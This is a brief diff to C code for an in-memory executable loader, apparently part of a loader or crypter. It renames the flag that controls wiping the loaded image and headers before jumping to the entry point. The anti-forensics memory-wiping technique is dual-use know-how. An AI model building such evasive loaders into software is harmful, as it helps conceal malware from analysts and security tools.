@@ -206,7 +206,7 @@ static void ExecuteFromMemory(unsigned char* data) {
     // Execute entrypoint
     void *entryPtr = (BYTE*)base + nt->OptionalHeader.AddressOfEntryPoint;
 
-#ifdef WIPEIMAGE
+#ifdef WIPEMEM
     #ifdef WIPEHEADERS
         #define MEM base
     #else
@@ -221,7 +221,7 @@ static void ExecuteFromMemory(unsigned char* data) {
     NtFreeVirtualMemory((HANDLE)-1, &memBase, &memSize, MEM_DECOMMIT);
 
     #undef MEM
-#endif // WIPEIMAGE
+#endif // WIPEMEM
 
     ((void(*)(void))entryPtr)();
 }
